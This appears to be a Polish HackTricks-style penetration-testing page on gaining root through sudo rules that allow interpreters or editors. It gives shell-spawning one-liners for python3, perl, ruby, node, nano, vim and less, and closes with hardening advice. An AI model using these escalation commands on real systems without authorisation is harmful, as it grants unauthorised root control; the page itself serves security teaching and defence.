# Nadużycie poleceń Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpretery dozwolone przez Sudo

Jeśli `sudo -l` pozwala użytkownikowi uruchomić interpreter jako root, należy traktować to jako bezpośrednie wykonanie kodu. Interpretery są przeznaczone do wykonywania dowolnego kodu, dlatego reguła zezwalająca na użycie `python3`, `perl`, `ruby`, `lua`, `node` lub podobnych plików binarnych jest zwykle równoważna z wykonaniem poleceń jako root, chyba że argumenty są ściśle ograniczone i walidowane.

Typowy przebieg analizy:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Inne przykłady interpreterów:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Dokładna ścieżka ma znaczenie. Jeśli reguła sudo zezwala na `/usr/bin/python3`, użyj tej dokładnej ścieżki podczas weryfikacji:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Edytory dozwolone przez Sudo

Jeśli `sudo -l` pozwala użytkownikowi uruchomić interaktywny edytor jako root, należy traktować to jako powierzchnię wykonywania poleceń, a nie jako nieszkodliwe uprawnienie do edycji plików. Edytory często pozwalają wykonywać shell commands, odczytywać dowolne pliki, zapisywać dowolne pliki lub wywoływać zewnętrzne helpery z poziomu edytora.

Typowy przebieg analizy:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Wykonywanie poleceń w Nano

Gdy `nano` jest dozwolone przez sudo, wykonywanie poleceń może być dostępne z poziomu interfejsu edytora:
```text
Ctrl+R
Ctrl+X
```
Następnie podaj polecenie, takie jak:
```bash
id
/bin/sh
```
Na niektórych terminalach interaktywna powłoka może wymagać przekierowania standardowych strumieni:
```bash
reset; /bin/sh 1>&0 2>&0
```
Dokładna sekwencja klawiszy może się różnić w zależności od wersji nano i opcji kompilacji, ale problem bezpieczeństwa pozostaje ten sam: edytor działa jako root i może uruchamiać zewnętrzne polecenia.

### Inne typowe sposoby ucieczki z edytora

Edytory w stylu Vim często udostępniają wykonywanie poleceń za pomocą `:!`:
```text
:!/bin/sh
```
Programy stronicujące, takie jak `less`, mogą również umożliwiać wykonywanie poleceń powłoki:
```text
!/bin/sh
```
## Uwagi dotyczące obrony

- Unikaj przyznawania przez sudo dostępu do interpreterów lub interaktywnych edytorów.
- Preferuj stałe wrappery należące do użytkownika root, które wykonują jedno, ściśle określone działanie administracyjne.
- Jeśli interpreter jest nieunikniony, ogranicz dokładną ścieżkę skryptu i uniemożliw kontrolowanie argumentów przez użytkownika, używanie zapisywalnych importów i `PYTHONPATH` oraz niebezpieczne zachowywanie środowiska.
- Jeśli wymagana jest edycja pliku, ogranicz dokładną ścieżkę pliku i rozważ użycie `sudoedit` wraz z załatanymi wersjami sudo oraz ścisłym zarządzaniem środowiskiem.
- Sprawdź `SETENV`, `env_keep`, zapisywalne katalogi robocze, zapisywalne ścieżki modułów/importów, `NOEXEC`, `use_pty` i logowanie, ale nie traktuj ich jako kompletnego sandboxa.
